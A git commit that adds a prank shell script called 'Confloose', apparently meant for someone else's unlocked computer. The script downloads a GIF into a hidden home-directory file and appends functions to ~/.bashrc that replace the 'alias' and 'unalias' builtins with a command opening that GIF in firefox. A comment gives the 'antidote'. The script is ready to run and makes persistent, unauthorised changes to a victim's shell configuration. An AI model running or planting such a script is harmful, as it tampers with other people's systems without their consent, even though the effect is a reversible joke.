a9c4597632bc233c69d9f53a3ad3f55ebdf123d8
vianney.marticou <la.regle.du.jeu.ytb@gmail.com>
2023-10-15 14:31:05 +0200

    [UNALIAS] Create a simple alias

---
+++ unalias.sh
@@ -0,0 +1,15 @@
+# Creator : MrVyM
+	
+### Confloose ###
+# Unalias 
+
+cd 
+curl https://media.tenor.com/4PihZhC7CTcAAAAC/non-nan.gif -o .nan.gif
+echo "unalias() { firefox ~/.nan.gif; }" >> ~/.bashrc 
+echo "alias() { firefox ~/.nan.gif; }" >> ~/.bashrc 
+echo "Unalias : End"
+### Antidote ###
+
+# Win+Enter
+# vim ~/.bashrc
+# Remove the line at the end of the file and save
